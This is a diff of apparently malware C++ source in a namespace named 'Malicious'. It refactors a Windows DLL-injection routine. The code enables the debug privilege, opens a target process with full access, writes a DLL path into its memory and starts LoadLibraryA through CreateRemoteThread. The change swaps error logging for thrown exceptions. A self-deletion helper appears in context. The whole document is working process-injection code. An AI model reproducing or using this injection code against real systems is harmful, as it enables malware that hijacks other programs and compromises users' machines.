@@ -5,64 +5,16 @@ using namespace System;
 
 namespace Malicious
 {
-	bool inject(DWORD pid, std::string dll)
-	{
-		// l'adresse de LoadLibraryA est la même dans tous les processus
-		// donc la fonction pourra correctement s'exécuter dans l'espace 
-		// du processus injecté
-		HMODULE hLocKernel32 = GetModuleHandle("Kernel32");
-		if(hLocKernel32 == NULL)
-		{
-			FATAL_ERROR("Error GetModuleHandle : " + toString(GetLastError()));
-		}
-
-		FARPROC hLocLoadLibrary = GetProcAddress(hLocKernel32, "LoadLibraryA");
-		if(hLocLoadLibrary == NULL)
-		{
-			FATAL_ERROR("Error GetProcAddress : " + toString(GetLastError()));
-		}
-
-        if (!SetDebugPrivileges())
-        {
-            FATAL_ERROR("Error SetDebugPrivileges : " + toString(GetLastError()));
-        }
-
-		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
-		if(hProc == NULL)
-		{
-            FATAL_ERROR("Erreur OpenProcess : " + toString(GetLastError()));
-		}
-
-		dll += '\0';
-		LPVOID hRemoteMem = VirtualAllocEx(hProc, NULL, dll.size(), MEM_COMMIT, PAGE_READWRITE);
-		if(hRemoteMem == NULL)
-		{
-            FATAL_ERROR("Erreur VirtualAllocEx : " + toString(GetLastError()));
-		}
-
-		SIZE_T numBytesWritten;
-		if(!WriteProcessMemory(hProc, hRemoteMem, (void *)dll.c_str(), dll.size(), &numBytesWritten))
-		{
-            FATAL_ERROR("Erreur WriteProcessMemory : " + toString(GetLastError()));
-		}
-		
-		HANDLE hRemoteThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)hLocLoadLibrary, hRemoteMem, 0, 0);
-		if(hRemoteThread == NULL)
-		{
-            FATAL_ERROR("Erreur CreateRemoteThread : " + toString(GetLastError()));
-		}
-		return true;
-	}
-
-    bool SetDebugPrivileges()
+    void SetDebugPrivileges()
     {
+		LOG_THIS_FUNCTION
+
 	    TOKEN_PRIVILEGES Debug_Privileges;
 	    if (!LookupPrivilegeValue (NULL, // Privieleges for the local system
 								   SE_DEBUG_NAME, // define the name of the privilege 
                                    &Debug_Privileges.Privileges[0].Luid)) // will get the LUID value into this variable
         {	
-            LOG_LAST_ERROR();
-		    return false;
+            throw InjectionError("LookupPrivilegeValue failed : "+toString(GetLastError()));
         }
 
 	    DWORD err = 0;
@@ -71,12 +23,12 @@ namespace Malicious
                                TOKEN_ADJUST_PRIVILEGES, //set the desired access
                                &hToken)) // handle to the token will be held here 
         {
-            LOG_LAST_ERROR();
+            InjectionError injectionError("OpenProcessToken failed : "+toString(GetLastError()));
 		    if (hToken)
             {
         	    CloseHandle (hToken);
             }
-            return false;
+            throw injectionError;
         }
 
 	    Debug_Privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
@@ -88,15 +40,61 @@ namespace Malicious
 								    NULL,
 								    NULL))
         {
-            LOG_LAST_ERROR();
+            InjectionError injectionError("AdjustTokenPrivileges failed : "+toString(GetLastError()));
 		    if (hToken)
             {
-                CloseHandle (hToken);
+        	    CloseHandle (hToken);
             }
-            return false;
+            throw injectionError;
         }
-	    return true; 
     }
+
+	bool inject(DWORD pid, std::string dll)
+	{
+		LOG_THIS_FUNCTION
+
+		// l'adresse de LoadLibraryA est la même dans tous les processus
+		// donc la fonction pourra correctement s'exécuter dans l'espace 
+		// du processus injecté
+		HMODULE hLocKernel32 = GetModuleHandle("Kernel32");
+		if(hLocKernel32 == NULL)
+		{
+			throw InjectionError("GetModuleHandle failed : "+toString(GetLastError()));
+		}
+
+		FARPROC hLocLoadLibrary = GetProcAddress(hLocKernel32, "LoadLibraryA");
+		if(hLocLoadLibrary == NULL)
+		{
+			throw InjectionError("GetProcAddress failed : "+toString(GetLastError()));
+		}
+
+        SetDebugPrivileges();
+
+		HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
+		if(hProc == NULL)
+		{
+			throw InjectionError("OpenProcess failed : "+toString(GetLastError()));
+		}
+
+		dll += '\0';
+		LPVOID hRemoteMem = VirtualAllocEx(hProc, NULL, dll.size(), MEM_COMMIT, PAGE_READWRITE);
+		if(hRemoteMem == NULL)
+		{
+			throw InjectionError("VirtualAllocEx failed : "+toString(GetLastError()));
+		}
+
+		SIZE_T numBytesWritten;
+		if(!WriteProcessMemory(hProc, hRemoteMem, (void *)dll.c_str(), dll.size(), &numBytesWritten))
+		{
+			throw InjectionError("WriteProcessMemory failed : "+toString(GetLastError()));
+		}
+		
+		HANDLE hRemoteThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)hLocLoadLibrary, hRemoteMem, 0, 0);
+		if(hRemoteThread == NULL)
+		{
+			throw InjectionError("CreateRemoteThread failed : "+toString(GetLastError()));
+		}
+	}
 
     void DeleteMyself(const char * tempfilename, const char * cmd)
     {
